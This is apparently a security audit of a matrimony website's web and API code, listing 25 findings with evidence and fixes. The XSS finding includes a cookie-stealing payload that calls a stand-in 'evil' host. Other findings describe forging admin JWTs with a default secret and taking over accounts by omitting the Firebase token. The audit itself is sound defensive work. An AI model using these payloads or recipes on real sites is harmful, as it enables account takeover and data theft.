# web-user-area

## summary
I read the whole of routes/index.js and app.js, plus every logged-in view: dashboard, profile-details, update-profile, user-chat, user-interests, user-plan, user-setting, shortlisted, blocked-users, profile-visitors, notifications, all-profiles, ice-breaker-game and onboarding. I read the script sections of register, login, forgot-password and reset-password and the header partial. For every web call I traced the API side: authMiddleware, adminAuth, AuthController (token signing, firebase logins, getMe, password reset), userRoutes.js, UserController (editProfile, fetchProfile, applyPrivacySettings, cities) and socket.js. The web is a thin EJS shell. Login stores the API JWT in a cookie named 'token' that is not httpOnly, uses SameSite=Lax and is scoped to .banjaramatch.com. Login and register write it from client JS (Secure is missing there), and Google login also copies it to localStorage. Client JS reads it from document.cookie and calls https://api.banjaramatch.com directly, mostly over REST, with chat and calls over Socket.IO. The most serious problems are on the API, but they decide whether the web is safe. The JWT secret is the public default 'your_jwt_secret': the web .env has no JWT_SECRET so it uses the fallback, and the API .env sets the literal value. The firebase login and register endpoints only check the Firebase token if one is sent, so leaving it out lets anyone log in as any email. Almost every user endpoint has no auth and trusts my_user_id/user_id from the request body; the dashboard's server-side calls even send no token. The Socket.IO server has no auth either. Names, chat messages and notification text go into innerHTML/.html() without escaping. With no CSP and a cookie JS can read and that is shared with admin.banjaramatch.com, any of these is stored XSS that can steal the token. Privacy settings (photo visibility, showIncome/showLocation, allowMessages/allowConnections) are saved but never enforced, and fetchProfile ignores block lists. Several limits exist only in the browser (gender lock, 18+ DOB) and the API does not enforce them. Broken flows: 'Chat Now' deep links that the chat page ignores, a registration dead end on a duplicate phone, /thank-you firing Google Ads conversions on every visit (there is no session middleware), and the location dropdowns sending the wrong parameter names. The /:slug catch-all is case-sensitive and returns 404, not a redirect. It returns 404 for valid pages when the API errors, and it serves city pages that are active but unpublished. /api/regenerate-sitemap and /api/proxy/cities are public and unauthenticated. The cities proxy hits a MongoDB lookup, not Google Places, so there is no billing risk, but the search regex and the limit are unbounded.

## findings (25)

### [CRITICAL][security] JWT signing secret is the public default 'your_jwt_secret' on both web and API, so anyone can forge user or admin tokens
- where: /var/www/banjaramatch.com/routes/index.js:7
- evidence: web routes/index.js:7 `const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret';` (web .env only has GA4_MEASUREMENT_ID, ENABLE_ANALYTICS, NODE_ENV, PORT). API: `grep -c '^JWT_SECRET=your_jwt_secret$' /var/www/api.banjaramatch.com/.env` -> 1. API middleware/authMiddleware.js:3 and middleware/adminAuth.js:4 use the same secret; adminAuth.js:27-40 only checks that decoded._id has role 'admin' in the DB.
- impact: An attacker signs {_id:<any user id>} with 'your_jwt_secret' and passes ensureAuth (routes/index.js:159), /api/auth/me and fetchProfile as that user. If they sign an admin's _id they get every adminAuth route (blogs, APK upload, assignMembership). Tokens last 7 days and there is no revocation.
- fix: Generate a 64-byte random JWT_SECRET, put it in both the API and web env (or drop local jwt.verify in the web and rely only on /api/auth/me), and remove every `|| 'your_jwt_secret'` fallback so the process fails at startup if it is missing. Rotating the secret logs everyone out; plan for it. Use a separate secret or audience for admin tokens.

### [CRITICAL][security] Firebase login and register endpoints only verify the Firebase ID token if one is sent, so leaving it out allows takeover of any account
- where: /var/www/api.banjaramatch.com/controllers/AuthController.js:67
- evidence: AuthController.js:67-68 `// Optionally verify Firebase token for extra security\n    if (firebaseToken) {` then :81 `let user = await User.findOne({ email })` -> :111 `sendTokenResponse(...)`. Same pattern in firebaseGoogleLogin :230-255 (`Skipping token verification (no token provided)`) and firebaseEmailRegister :127-138, which for an existing email overwrites :175-178 `user.full_name = full_name; user.phone = phone || user.phone; user.firebase_uid = firebaseUid;`. The web calls these from login.ejs:331, login.ejs:552 and register.ejs:290.
- impact: POST /api/auth/firebase-email-login with {email:'victim@x.com', firebaseUid:'anything'} and no firebaseToken returns a valid 7-day JWT plus the victim's full user document. firebase-email-register with a victim's email also rewrites their name, phone and firebase_uid.
- fix: Make firebaseToken mandatory. Take email and uid only from the result of admin.auth().verifyIdToken() (decoded.email, decoded.uid, decoded.email_verified), never from the request body. Refuse to overwrite an existing account in register.

### [CRITICAL][security] Nearly all user endpoints have no auth and trust my_user_id/user_id from the request body; the web relies on this (the dashboard server sends no token)
- where: /var/www/api.banjaramatch.com/routes/userRoutes.js:13
- evidence: userRoutes.js:13 `router.post('/editProfile',  upload.uploadProfileImages, UserController.editProfile);` :16 `router.post('/deleteUser',  UserController.deleteUser);` :37 acceptInterestRequest, :62 fetchMessages, :78 getInterestList all have no `authenticate` (only fetchProfile at :15 does). UserController.js:125-128 editProfile reads `user_id` from the body; :276 `if (membership) user.membershipPlan = membership;` :335 `if (is_verified !== undefined) user.is_verified = Boolean(is_verified);`. Web routes/index.js:754 `await axios.post(fetchUsersListUrl, fetchUsersListPayload)` sends no Authorization header; update-profile.ejs:64 `<input type="hidden" name="user_id" value="<%= user._id %>">`.
- impact: Anyone with curl can edit any profile, give themselves the verified badge or a membership plan, delete any user, read anyone's interests, visitors and shortlist, accept, reject or cancel interests for other people, and read any chat room's messages by roomId (UserController.js:3285-3298). User _ids appear in /profile/<id> links and API responses.
- fix: Apply `authenticate` to every non-public route (router.use(authenticate) after the public list endpoints) and take the acting user from req.user._id, ignoring body my_user_id/user_id. Remove is_verified, membership and role from editProfile's whitelist. In fetchMessages, check the caller belongs to the room. The web server should pass the user's Bearer token on its server-side calls. Check the Flutter app's request shapes before enforcing.

### [CRITICAL][security] Stored XSS: chat messages, names and notification text go into innerHTML with no escaping, while the auth cookie is readable by JS, there is no CSP, and the cookie is shared with the admin subdomain
- where: /var/www/banjaramatch.com/views/pages/user-chat.ejs:721
- evidence: user-chat.ejs:721 `${msg.content}` and :750 `${message.content}` (rendered via $('#chatMessages').html/append), :581 `<span>${lastMessage}</span>`, :674 `$('#chatUserName').html(currentChatUser.full_name + ...)`; user-dashboard.ejs:836 `<h5>${otherUser.full_name || 'Unknown'}</h5>` and :889 `${a.title}`; user-interests.ejs:252 `<h5>${user.full_name}</h5>`; all-profiles.ejs:799 `${profile.full_name || ...}`; notifications.ejs:176 `<div>${n.content}</div>` (content built from names, UserController.js:1158); blocked-users.ejs:139; profile-visitors.ejs:181. Server side: socket.js:173-177 stores `content` raw, editProfile :271 `if (full_name) user.full_name = full_name;` with no sanitising. app.js:18 `contentSecurityPolicy: false`. Cookie: AuthController.js:34 `httpOnly: false` with `domain: '.banjaramatch.com'`; admin/authController.js:67-72 sets the same 'token' cookie name on the same domain.
- impact: Setting full_name to `<img src=x onerror=fetch('//evil/?'+document.cookie)>` and then sending an interest, visiting a profile (which creates a notification) or sending a chat message runs script in the victim's www session and steals the 7-day JWT. If an admin is logged in on admin.banjaramatch.com, their admin token is in the same cookie jar and gets stolen too.
- fix: Use textContent or an escapeHtml() helper for every user-controlled value in client templates (one shared helper in public/js). Sanitise or strip HTML in full_name, bio and message content on the API. Move auth to an httpOnly, Secure, host-only cookie and stop reading the token from document.cookie (proxy API calls through the web server or use credentials:'include'). Give admin its own cookie name on its own host. Turn on a CSP with nonces.

### [CRITICAL][security] Socket.IO server is unauthenticated: a client can join as any userId and send messages as anyone
- where: /var/www/api.banjaramatch.com/socket.js:46
- evidence: socket.js:46-52 `socket.on('join', async (userId) => { ... onlineUsers.set(userId, socket.id); socket.userId = userId;` then :78-84 sends that user's undelivered messages to the caller; :146-147 `socket.on('send_message', async (data) => { const { senderId, receiverId, content, type = 'text' } = data;` with no check of senderId, room acceptance, blocks or allowMessages; api index.js:77 `socketIO(server, { cors: { origin: '*' } })`. Web user-chat.ejs:430 `socket.emit('join', MY_USER_ID);` (the auth token sent at :424 is never checked server-side).
- impact: An attacker connects and emits join(<victimId>) to receive the victim's pending messages and take over their realtime presence. They can also send messages as any user to anyone, ignoring connection status, blocks and the 'Allow Messages From' setting.
- fix: Add io.use() middleware that verifies the JWT from socket.handshake.auth.token and sets socket.userId from it. Ignore client-supplied userId/senderId. Before sending, require an accepted ChatRoom and check blocked lists and allowMessages. Restrict CORS origins.

### [HIGH][security] Live JWTs and user PII are written to pm2 logs (thousands of tokens on disk)
- where: /var/www/banjaramatch.com/routes/index.js:151
- evidence: routes/index.js:151 `console.log('[ensureAuth] Token from cookie:', token);` :160 `console.log('[ensureAuth] JWT decoded:', decoded);` :166 `console.log('[ensureAuth] /me response:', data);` :180 likewise. `grep -c 'Token from cookie: eyJ' /root/.pm2/logs/banjaramatch-web-out.log` -> 2645; `grep -c '[getMe] Token: eyJ' banjaramatch-api-out.log` -> 4550 (AuthController.js:871). Log files are 13 MB and 6.9 MB, -rw-r--r--, no pm2-logrotate found.
- impact: Anyone who can read the logs (backups, support staff, a compromised pm2 host) can replay valid sessions. Full /me profiles (phone, email, DOB) are also logged on every authenticated page view. This is a DPDP/privacy exposure.
- fix: Remove token, decoded-payload and /me-response logging from the web and API, purge or rotate the existing log files, and install pm2-logrotate.

### [HIGH][business-logic] Privacy settings are saved but never enforced; profile pages always show photos, income and location
- where: /var/www/banjaramatch.com/views/pages/user-setting.ejs:168
- evidence: user-setting.ejs:168-172 offers profilePicVisibility 'onlyPremium'/'onlyAccepted'/'nobody', and :150-163 offers showLocation/showIncome, :187-201 allowConnections/allowMessages. `grep -rn 'profilePicVisibility\|allowMessages\|allowConnections\|showIncome\|showLocation'` in API code matches only models/User.js and restoreUsers.js. API applyPrivacySettings (UserController.js:29-49) handles only email and phone. profile-details.ejs:342-357 renders every photo, :401 `<li><b>Income Range:</b> <%= incomeRange %></li>`, :381 full address.
- impact: Users (often women) who choose 'Nobody' for photos or hide income and location still have them shown to every logged-in member and returned by the API. This is a trust and legal risk for a matrimony site.
- fix: Enforce all settings server-side in one serializer used by fetchProfile, fetchUsersList, searchProfiles and chat (blur or strip photos by visibility and connection status, drop income and location when disabled). Enforce allowConnections in sendInterestRequest and allowMessages in socket send_message. Render only what the API returns.

### [HIGH][security] fetchProfile ignores block lists, notifies the blocker of the blocked user's visit, and returns secret fields
- where: /var/www/api.banjaramatch.com/controllers/UserController.js:981
- evidence: UserController.js:981-988 `User.findOne({ _id: profileId }).populate(...)` with no `blocked` check (no occurrence of 'blocked' in lines 969-1300); :1157-1170 sends 'just visited your profile' push and email. :998 `const profile = profileDoc.toObject();` returned at :1260; models/User.js has no toJSON transform, so `password` (:77), `firebase_uid` (:67) and device_token are returned. Web user-chat.ejs:637-647 calls fetchProfile from the browser.
- impact: A blocked user can still open the victim's profile through /profile/:id, and the victim gets 'X just visited your profile' notifications, which enables harassment. Any token holder (forgeable, see the JWT finding) gets password hashes, FCM device tokens and Firebase UIDs of other users.
- fix: Return 404 when either side has blocked the other, and skip visitor logging and notifications for blocked pairs. Add a toJSON/toObject transform (or .select('-password -firebase_uid -device_token ...')) for any profile shown to someone other than its owner.

### [HIGH][business-logic] Client-only rules: gender lock and 18+ DOB are enforced only in HTML; the API accepts any gender and DOB
- where: /var/www/banjaramatch.com/views/pages/onboarding.ejs:529
- evidence: onboarding.ejs:529-531 `maxDate.setFullYear(maxDate.getFullYear() - 18); $('#dob').attr('max', ...)` (HTML attribute only); update-profile.ejs:120-125 `<select ... name="gender" disabled>` with `Gender cannot be changed`. API UserController.js:273-274 `if (gender) user.gender = gender; if (dob) user.dob = dob;` with no age or immutability check.
- impact: Minors can register by posting any DOB directly, which contradicts /child-safety-policy. Users can flip gender after matching to appear in the opposite pool.
- fix: Validate on the API: age >= 18 (and 21 for men if you follow Indian marriage-age policy). Allow gender to be set only once (when unset) or by an admin. Return 400 with a clear message.

### [HIGH][business-logic] Registration dead end: the Firebase account is created before the backend call, so a duplicate phone leaves the user stuck
- where: /var/www/banjaramatch.com/views/pages/register.ejs:274
- evidence: register.ejs:274 `await auth.createUserWithEmailAndPassword(email, password);` then :290 POST firebase-email-register. models/User.js:63-65 `phone: { type: String, unique: true, sparse: true`. AuthController.js:157 `await user.save();` -> catch :195-197 `return res.status(500).json({ status: false, message: 'Server error' });`. Phone is never OTP-verified (register.ejs:138 is a plain input).
- impact: Entering a phone that already exists returns 'Server error' after the Firebase account exists. Retrying shows 'This email is already registered. Please login', and login then gives 'User not found. Please register first.' (AuthController.js:87-88), so the user can never get in. Squatting someone's phone also blocks the real owner. Lost signups mean lost revenue.
- fix: Pre-check email and phone with an API call before Firebase signup, map E11000 to a 409 with a field-specific message, and on backend failure either delete the Firebase user or let login auto-provision. Add phone OTP or email verification before the profile goes live.

### [HIGH][business-logic] /thank-you fires Google Ads conversions on every visit (no session middleware) and the register flow double-counts
- where: /var/www/banjaramatch.com/routes/index.js:497
- evidence: routes/index.js:497-508 `if (!req.session) { req.session = {}; } if (req.session.thankYouShown === true) {...} req.session.thankYouShown = true;`. app.js and package.json contain no session middleware. thank-you.ejs:41-48 fires `gtag('event','conversion',{send_to:'AW-357336842/...'})` on load; register.ejs:311 calls `window.trackRegistrationConversion()` (analytics.ejs:80-88, same two conversions) before redirecting to /thank-you.
- impact: Each registration counts at least twice, and every refresh or revisit of /thank-you adds more. Google Ads smart bidding learns from inflated conversions and wastes ad spend.
- fix: Fire conversions in one place only. Gate /thank-you with a one-time signed cookie or a DB flag (user.thankYouShownAt) set by the API at registration; redirect to /dashboard otherwise.

### [HIGH][infra] Every page blocks on API calls with no timeout; any API slowness hangs the whole site or logs users out
- where: /var/www/banjaramatch.com/routes/index.js:22
- evidence: routes/index.js:22 `await axios.get(`${AUTH_SERVER_URL}/api/auth/me`, {headers...})` (optionalUser runs on every public page), :162 ensureAuth, :188, :237/241 homepage blogs, :754-848 nine sequential dashboard calls; none pass `timeout` (only :1236 `timeout: 5000`). ensureAuth catch :170-173 clears the cookie and redirects to /login on any error. AUTH_SERVER_URL defaults to the public https://api.banjaramatch.com (:9), not localhost:4002.
- impact: If the API stalls (Mongo or socket load), the homepage and all SEO landing pages hang. This hurts crawl budget and Core Web Vitals and risks the 'banjara matrimony' ranking. On any transient API 5xx, logged-in users are bounced to /login. The dashboard makes 9 serial round trips through public DNS and TLS.
- fix: Create one axios instance with baseURL http://127.0.0.1:4002, timeout ~2-3s and keep-alive. Run dashboard calls in Promise.all. In optionalUser, decode the JWT locally and fetch /me lazily or cache it briefly. In ensureAuth, redirect only on 401 and show a degraded page on 5xx.

### [MEDIUM][business-logic] 'Chat Now' and room deep links are ignored by the chat page; there is no web path to start a conversation
- where: /var/www/banjaramatch.com/views/pages/profile-details.ejs:232
- evidence: profile-details.ejs:232 `<a href="/user-chat?userId=<%= profile._id %>"`; user-dashboard.ejs:839 `/user-chat?room=${chat._id}`; all-profiles.ejs:807 `<a href="/user-chat" class="cta-chat">Chat now</a>`; user-interests.ejs:229 same. user-chat.ejs never reads URL params (grep for URLSearchParams/location.search finds nothing). Also socket.js:151-153 `if(detectSensitiveContentAdvanced(content)){ return }` silently drops messages while user-chat.ejs:778 clears the input.
- impact: Users click 'Chat Now' and land on a generic list with no conversation opened. Messages containing a number or handle disappear with no feedback. Members think chat is broken and leave, especially on mobile.
- fix: Read ?userId/?room on load and call openChat (or fetchOrGenerateRoom). Emit a 'message_blocked' event with a reason and show it in the UI.

### [MEDIUM][security] /api/regenerate-sitemap is a public, unauthenticated POST that rewrites sitemap files
- where: /var/www/banjaramatch.com/routes/index.js:1209
- evidence: routes/index.js:1209 `router.post('/api/regenerate-sitemap', async (req, res) => {` has no auth, and nginx proxies all of www to :4000 (`location / { proxy_pass http://localhost:4000;`). generateRegionalSitemap.js:41-49 writes an EMPTY sitemap-regional.xml when the API returns no pages; generateBlogSitemap.js:32-41 likewise. writeFileSync runs without locking.
- impact: Anyone can trigger unlimited regenerations (API fan-out and disk writes). Concurrent runs or a transient empty API response can serve Google an empty regional or blog sitemap, which drops the very pages that rank for 'banjara matrimony <state>'.
- fix: Require a shared secret header or restrict to 127.0.0.1 and have the admin call it server-to-server. Write to a temp file and rename atomically, and never overwrite a non-empty sitemap with an empty one.

### [MEDIUM][security] /api/proxy/cities passes any request body to a regex DB search with no limit cap
- where: /var/www/banjaramatch.com/routes/index.js:1232
- evidence: routes/index.js:1232-1234 `router.post('/api/proxy/cities', async (req, res) => { const response = await axios.post(`${AUTH_SERVER_URL}/api/cities`, req.body, ...` API UserController.js:3617 `const { search = '', stateId, state, page = 1, limit = 200, ...} = req.body;` :3677 `name: { $regex: search, $options: 'i' }` :3685 `.limit(Number(limit))`.
- impact: There is no Google Places billing (it is a Mongo City lookup). However, unauthenticated callers can send catastrophic regexes (ReDoS) or limit=1e6 to load the DB through the public www domain.
- fix: Whitelist fields in the proxy (search escaped with a regex-escape helper, max 50 chars; stateId as ObjectId; cap limit at 50), add express-rate-limit, and cache responses.

### [MEDIUM][seo] /:slug catch-all is case-sensitive, turns API errors into 404s and serves unpublished city pages
- where: /var/www/banjaramatch.com/routes/index.js:1142
- evidence: routes/index.js:1142 `if (!slug.startsWith('banjara-matrimony-')) { return next(); }` (case-sensitive). Live: /Banjara-Matrimony-Telangana -> 404 and /banjara-matrimony-TELANGANA -> 404 while /banjara-matrimony-telangana -> 200. :1157-1168: any city-request error (timeout or 5xx, not just 404) falls to the state lookup and then `return next()` (404). API cityRegionalPageController.js:426 `CityRegionalPage.findOne({ slug, isActive: true })` has no isPublished filter, but the sibling list at :441-446 requires isPublished.
- impact: Mixed-case backlinks and ad URLs return 404 instead of consolidating. During an API blip Googlebot receives hard 404s for ranking regional pages. Draft city pages (active but unpublished) are publicly reachable and indexable.
- fix: 301-redirect to slug.toLowerCase() when they differ. Return 503 (with Retry-After) on non-404 API errors instead of next(). Add isPublished:true to the public slug lookup. Keep static routes defined before the catch-all, as they are now.

### [MEDIUM][business-logic] Edit-profile location dropdowns send the wrong parameter names, so state and city are not filtered
- where: /var/www/banjaramatch.com/views/pages/update-profile.ejs:724
- evidence: update-profile.ejs:693 `body: JSON.stringify({ country_id: countryId })` and :724 `body: JSON.stringify({ state_id: stateId })`; API UserController.js:3593 `const { search = '', countryId, ...}` and :3617 `{ search = '', stateId, state, ... }`.
- impact: After choosing a country or state, users get the first 200 states or cities alphabetically from everywhere. Their own city may be missing and they cannot pick it, so location data degrades and location-based matching and filters break.
- fix: Send countryId and stateId, or accept both names on the API.

### [MEDIUM][security] Client-side token handling: cookie set without Secure, token copied to localStorage, cookies and tokens logged to the console
- where: /var/www/banjaramatch.com/views/pages/login.ejs:347
- evidence: login.ejs:347 `document.cookie = `token=${loginData.token}; path=/; max-age=...; domain=.banjaramatch.com; SameSite=Lax`;` (no Secure; same at register.ejs:308); login.ejs:590 `localStorage.setItem('auth_token', loginData.token);` :583-584 `console.log('Current cookies:', cookies);`. The API also returns the full user document, including the password hash, in the login body (AuthController.js:44-49 `data: userData`).
- impact: Widens the window for token theft (via the XSS findings, shared devices and browser extensions). The cookie can be sent over plain HTTP before the HSTS preload is effective.
- fix: Let only the server set the cookie (httpOnly, Secure, SameSite=Lax, host-only). Remove localStorage and console token logging, and strip sensitive fields from the login response.

### [MEDIUM][security] Password-reset oobCode leaks to Google Analytics and the API logs; logged-in users cannot open the reset page
- where: /var/www/banjaramatch.com/views/pages/reset-password.ejs:23
- evidence: reset-password.ejs:23 `<%- include('../partials/analytics', { pageCategory: 'reset-password' }) %>` on a URL carrying ?oobCode=...; API AuthController.js:1116 `console.log('OOB Code received:', oobCode);` and :1158; routes/index.js:472 `router.get('/reset-password', redirectIfAuthenticated, ...)`. API :1164 calls identitytoolkit with key `AIzaSyC488...` while the web Firebase project key is `AIzaSyBEQ...` (login.ejs:262).
- impact: The one-time reset code is sent to GA page_location and stored in logs. A user who is still logged in is redirected to /dashboard and cannot reset. If the API key belongs to another Firebase project, every reset fails with INVALID_OOB_CODE.
- fix: Exclude analytics on /reset-password (or strip the query string from page_location), stop logging oobCode, drop redirectIfAuthenticated on this route, and confirm both keys belong to project socialmedia-dcdd8.

### [MEDIUM][business-logic] Logout does not revoke the JWT, and expired-token handling fails to clear the domain cookie
- where: /var/www/banjaramatch.com/routes/index.js:172
- evidence: routes/index.js:172 `res.clearCookie('token');` (and :30), with no domain, while the cookie was set with `domain: '.banjaramatch.com'` (AuthController.js:38). Logout :1081 is a GET that only clears cookies and Firebase; it never calls POST /api/auth/logout and the stateless 7-day token stays valid.
- impact: Expired or invalid cookies are never removed, so every request re-runs a failing verify and warn log. A stolen token stays usable for 7 days after the user logs out.
- fix: Clear with the same domain and path options. Add a tokenVersion or jti check in the API (increment on logout or password change). Make logout POST with CSRF protection.

### [MEDIUM][ui] Header and sidebars use non-existent user fields and broken avatar paths; navigation is inconsistent
- where: /var/www/banjaramatch.com/views/partials/header.ejs:162
- evidence: header.ejs:162 `user.profilePhoto ? '/uploads/' + user.profilePhoto : '/images/profiles/default.jpg'` and :164 `<%= user.name || 'My Profile' %>`; the User model has `profile` and `full_name`, and public/images/profiles/default.jpg does not exist. Sidebar avatar `<%= user?.profile || ... %>` without the API host prefix at user-plan.ejs:89, user-setting.ejs:123, shortlisted.ejs:81, blocked-users.ejs:64, notifications.ejs:73, profile-visitors.ejs:83, update-profile.ejs:76. The mobile account menu at header.ejs:261-270 lacks Profile, Visitors, Plan and Settings; header.ejs:30-32 links `/all-profiles?filter=verified|new|premium`, which all-profiles ignores (routes/index.js:968-970 says so); header.ejs:244 shows a disabled 'Register for free' 'Coming soon'.
- impact: Logged-in users always see a broken or default avatar and 'My Profile' in the header (an image 404 on every page). Their own photo is missing on 7 dashboard pages, and mobile users cannot reach settings or plan from the account menu.
- fix: Create views/partials/user-sidebar.ejs (a single nav source taking an activeKey) and a photoUrl() EJS helper (res.locals) used everywhere. Fix the header to use full_name and profile. Implement or remove the ?filter links.

### [LOW][ui] Chat window is not responsive and zoom is disabled on 36 pages
- where: /var/www/banjaramatch.com/views/pages/user-chat.ejs:26
- evidence: user-chat.ejs:23-27 `.chat-window { position: fixed; right: 20px; width: 350px; height: 500px;` with no @media rules in the file (grep -c '@media' = 0); `maximum-scale=1` appears in 36 page templates (e.g. user-dashboard.ejs:8).
- impact: On phones of 360px or less the chat panel overflows off-screen (most Indian traffic is mobile). Blocking pinch-zoom fails WCAG 1.4.4 and is penalised in Lighthouse accessibility scores.
- fix: Make the chat window full-screen below 576px and remove maximum-scale=1 from the shared head partial.

### [LOW][ui] Profile-details rendering bugs and pointless markup on a private page
- where: /var/www/banjaramatch.com/views/pages/profile-details.ejs:295
- evidence: profile-details.ejs:295 `<%= profile?.isOnline ? '<b>Available</b> online' : 'Offline' %>` (escaped, so the tags show as text); :26 `"birthPlace": "<%= profile.location?.city || profile.city %>"` (an object, so it renders '[object Object]'); :13 canonical and :20-33 Person JSON-LD on an auth-only, robots-disallowed page; :526-527 `connectionStatus?.status/type` are never set; :467 'Register for free' shown to logged-in users; routes/index.js:1034 `profile.gender === 'male'` while the enum is 'Male' (enum.js:4); the API ignores it anyway. Year-only age math at user-dashboard.ejs:109, shortlisted.ejs:117 and profile-visitors.ejs:148.
- impact: Visible '<b>' text, wrong ages around birthdays, and misleading CTAs. These are cosmetic and trust issues.
- fix: Use <%- only for the static literal or restructure the markup, share one calculateAge helper, and remove the canonical and JSON-LD from private pages.

### [LOW][seo] robots.txt is out of date for the new private routes and blog paths
- where: /var/www/banjaramatch.com/robots.txt:15
- evidence: The Googlebot group disallows /dashboard, /all-profiles, /profile/* etc. but not /shortlisted, /notifications, /profile-visitors, /blocked-users, /user-plan, /ice-breaker-game or /thank-you; it has `Allow: /blog/*` while posts live at /blogs/...; the default group has `Disallow: /*?page=*` (blocks blog pagination for non-Google bots).
- impact: Crawl budget is wasted on 302s to /login, and other engines are inconsistent. Minor.
- fix: Add the new private paths to every group (or add X-Robots-Tag: noindex in an ensureAuth response), change /blog/* to /blogs/, and reconsider blocking ?page=.

### [LOW][security] Blog JSON-LD uses unescaped JSON.stringify inside a script tag
- where: /var/www/banjaramatch.com/views/pages/blog-detail.ejs:34
- evidence: blog-detail.ejs:34 `"headline": <%- JSON.stringify(blog.title) %>,` (and :35, :41, :55, :56); :141 `<%- blog.content %>`; regional-page-city.ejs:178/185/465/497/499/761 `<%- heroTitle %>` etc.
- impact: An admin-authored title containing '</script>' breaks out of the script tag. The risk is mostly from a compromised admin account (which is easy given the shared cookie and JWT issues).
- fix: Escape '<' as < in JSON-LD output and sanitise CMS HTML with sanitize-html on save.

## inventory
- Auth cookie: name 'token', value is the API JWT {_id,email}, expiresIn 7d. Set by the API (AuthController.js:33-43: httpOnly:false, secure:true, sameSite:'Lax', domain:'.banjaramatch.com', path:'/') and again by client JS (login.ejs:347, login.ejs:579, register.ejs:308, without httpOnly; Secure only at :579). Admin login sets the same cookie name and domain (admin/authController.js:67-72).
- localStorage key 'auth_token' (login.ejs:590, Google login only); logout clears it via localStorage.clear() (routes/index.js:1121)
- Web JWT verify: routes/index.js:7 JWT_SECRET falls back to 'your_jwt_secret' (the web .env has no JWT_SECRET); API .env JWT_SECRET is that literal value
- Web middlewares: optionalUser (routes/index.js:12), ensureAuth (:149), redirectIfAuthenticated (:178), checkProfileCompletion (:207; mandatory gender, dob, height, maritalStatus, caste, gotra -> /onboarding)
- Auth-only web routes: /onboarding, /ice-breaker-game, /thank-you (ensureAuth only); /dashboard, /update-profile, /user-interests, /user-chat, /user-setting, /user-plan, /shortlisted, /blocked-users, /notifications, /profile-visitors, /all-profiles, /profile/:userId (ensureAuth + checkProfileCompletion)
- Redirect-if-auth routes: /login, /register, /signup, /forgot-password, /reset-password, /admin-email-register (publicly reachable, 200)
- Legacy 301s: /terms-condition->/terms-conditions, /plans->/features, /banjara-matrimony-bangalore->-karnataka, /banjara-matrimony-pune->-maharashtra; app.js htmlRedirectMap (34 .html entries plus generic .html stripping)
- Catch-all /:slug (routes/index.js:1138) only handles the 'banjara-matrimony-' prefix (case-sensitive): GET /api/city-pages/:slug, then /api/state-pages/:slug, otherwise 404; templates regional-page-city/state.ejs
- Public web POST endpoints: /api/regenerate-sitemap (no auth), /api/proxy/cities (no auth, proxies to API /api/cities, used by index.ejs:2685)
- Dashboard SSR API calls (no Authorization header): POST /api/fetchUsersList {my_user_id,page:1,limit:10,sortByNewUsers}; /api/getInterestList type received|sent|accepted (limit 20); /api/getProfileVisitorSummary type they_viewed_me|i_viewed|mutual; /api/getShortListedUsers; /api/getTopDailyMatches; plus /api/auth/me (Bearer) in ensureAuth
- Profile SSR: POST /api/fetchProfile {user_id} (Bearer) and /api/fetchUsersList for related profiles (Bearer)
- Shortlisted SSR: POST /api/getShortListedUsers {my_user_id} (no token)
- Client->API (https://api.banjaramatch.com/api): dashboard: getProfileVisitorSummary, getIcebreakerStats (GET), fetchUserRooms, fetchLiveActivity, getMatchMomentum, download-apk
- Client->API: profile-details: sendInterestRequest, cancelInterestRequest, acceptInterestRequest, removeConnection, toggleShortlist, comparePreferencesFit, compatibility/guna-milan
- Client->API: update-profile: fetchCasteList, fetchGotraList, fetchProfessionList, fetchQualificationList, fetchIncomeRange, countries, states, cities, editProfile (multipart)
- Client->API: onboarding: fetchCasteList, fetchGotraList, editProfile; user-setting: editProfile {user_id, settings}
- Client->API: user-interests: getInterestList x3, acceptInterestRequest, rejectInterestRequest, cancelInterestRequest, removeConnection
- Client->API: user-chat: fetchUserRooms, fetchProfile, fetchMessages, fetchUsersList (isOnline), calls/token; Socket.IO at https://api.banjaramatch.com with events join, send_message, typing, stop_typing, mark_seen, call_invite/accept/reject/end; receives message_sent, receive_message, message_delivered, message_seen, user_typing, user_online/offline, call_*
- Client->API: all-profiles: searchProfiles, fetch*List dropdowns, sendInterestRequest, cancelInterestRequest, acceptInterestRequest, toggleShortlist
- Client->API: shortlisted: toggleShortlist; blocked-users: fetchBlockedUserList, UserUnblockedByUser; notifications: fetchUserNotification, markNotificationsRead; profile-visitors: getProfileVisitorSummary; ice-breaker: getIcebreakerStats, sendInterestRequest plus socket icebreaker_join_queue/leave_queue/answer
- Client->API auth: auth/firebase-email-login, auth/firebase-google-login, auth/firebase-email-register, auth/verify-password-reset-code, auth/confirm-password-reset; forgot-password uses the Firebase client sendPasswordResetEmail with continue URL https://www.banjaramatch.com/reset-password
- Other public-page client calls: beta-tester/stats, beta-tester/submit, contact/submit, auth/community-feedback, feedback/submit, newsletter/subscribe, track-share
- API endpoints protected by `authenticate`: only /api/fetchProfile among user routes; /api/auth/me verifies the JWT itself; all other userRoutes are unauthenticated
- Firebase web project socialmedia-dcdd8, web apiKey AIza<redacted-key> (inline in login/register/forgot-password/logout); API reset uses key AIza<redacted-firebase-web-key>
- Google Ads conversion IDs: AW-357336842/3N9aCIbm68obEIqOsqoB and AW-357336842/q-YJCIvsq8obEIqOsqoB (analytics.ejs:80-88, thank-you.ejs:41-48)
- Live checks: regional slugs telangana, delhi, gujarat, rajasthan, madhya-pradesh return 200; uppercase variants return 404; nonexistent slug returns 404; private routes 302 to /login; homepage TTFB ~0.05s, HTML 193KB; no CSP header; HSTS max-age=31536000 includeSubDomains
- pm2 logs: /root/.pm2/logs/banjaramatch-web-out.log 13MB (2645 JWTs), banjaramatch-api-out.log 6.9MB (4550 JWTs); no pm2-logrotate
- User sidebar nav is duplicated in 10 templates: user-dashboard, update-profile, user-interests, user-chat, user-setting, user-plan, shortlisted, blocked-users, notifications, profile-visitors

## reusable
- /var/www/banjaramatch.com/views/partials/header.ejs and footer.ejs: already conditional on `user`; fix the field names and use them as the base for one shared logged-in layout
- /var/www/banjaramatch.com/views/partials/analytics.ejs: central gtag plus window.trackRegistrationConversion; the right place to dedupe conversions and to skip /reset-password
- /var/www/banjaramatch.com/views/partials/breadcrumb.ejs: existing breadcrumb partial for SEO pages
- /var/www/banjaramatch.com/views/pages/profile-details.ejs:183-201: correct calculateAge and cmToFeetInches helpers to move into res.locals or a shared public/js/utils.js
- /var/www/banjaramatch.com/views/pages/blocked-users.ejs:118-121 and profile-visitors.ejs:138-141 photoUrl(): pattern for a shared avatar URL helper (prefix the API host for relative paths)
